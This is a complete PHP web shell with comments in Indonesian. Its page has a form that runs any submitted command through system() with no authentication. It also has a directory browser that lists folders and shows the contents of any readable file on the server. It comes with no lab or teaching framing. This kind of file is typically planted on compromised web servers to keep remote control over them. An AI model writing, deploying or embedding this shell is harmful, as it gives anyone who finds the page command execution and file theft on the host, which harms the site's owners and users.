<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Shell with File Preview</title>
</head>
<body>
    <h2>PHP Command Execution with File Preview</h2>

    <?php
    // Dapatkan direktori dari parameter URL atau gunakan direktori saat ini
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    
    // Pastikan currentDir adalah direktori yang valid
    if (!is_dir($currentDir)) {
        echo "<p>Invalid directory: $currentDir</p>";
        exit;
    }

    // Pindah ke direktori yang dipilih
    chdir($currentDir);

    // Preview file jika ada file yang dipilih
    if (isset($_GET['file'])) {
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['file'];

        if (is_file($filePath) && is_readable($filePath)) {
            echo "<h3>Preview of: " . htmlspecialchars($_GET['file']) . "</h3>";
            echo "<pre style='background-color:#f4f4f4;padding:10px;border:1px solid #ccc;max-height:400px;overflow:auto;'>";
            // Tampilkan isi file
            echo htmlspecialchars(file_get_contents($filePath));
            echo "</pre>";
        } else {
            echo "<p>File is not readable or does not exist.</p>";
        }
    }

    // Tampilkan form untuk menjalankan perintah
    ?>
    <form method="POST">
        <label for="command">Enter Command:</label><br>
        <input type="text" name="command" id="command" placeholder="Type your command here">
        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
        <input type="submit" value="Execute">
    </form>

    <?php
    // Eksekusi perintah jika ada input
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['command'])) {
        $command = $_POST['command'];

        // Eksekusi perintah
        echo "<h3>Result:</h3>";
        echo "<pre>";
        system($command);
        echo "</pre>";
    }

    // Tampilkan current working directory
    echo "<h3>Current Directory:</h3>";
    echo "<p>$currentDir</p>";

    // Tampilkan navigasi untuk folder di level atas
    echo "<h3>Navigate:</h3>";
    $dirParts = explode(DIRECTORY_SEPARATOR, $currentDir);
    $path = '';
    foreach ($dirParts as $key => $part) {
        $path .= $part . DIRECTORY_SEPARATOR;
        echo "<a href=\"?dir=" . urlencode($path) . "\">$part</a>" . ($key < count($dirParts) - 1 ? ' / ' : '');
    }

    // Tampilkan isi direktori saat ini
    echo "<h3>Directory Contents:</h3>";
    echo "<pre>";
    $items = scandir($currentDir);
    
    foreach ($items as $item) {
        if ($item == '.') {
            continue;
        }

        // Buat link jika item adalah direktori
        if ($item == '..') {
            $parentDir = dirname($currentDir);
            echo "<a href=\"?dir=" . urlencode($parentDir) . "\">../ (Parent Directory)</a><br>";
        } elseif (is_dir($item)) {
            $newDir = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
            echo "<a href=\"?dir=" . urlencode($newDir) . "\">$item/</a><br>";
        } else {
            // File: buat link untuk preview isi file
            echo "<a href=\"?dir=" . urlencode($currentDir) . "&file=" . urlencode($item) . "\">$item</a><br>";
        }
    }
    echo "</pre>";
    ?>
</body>
</html>
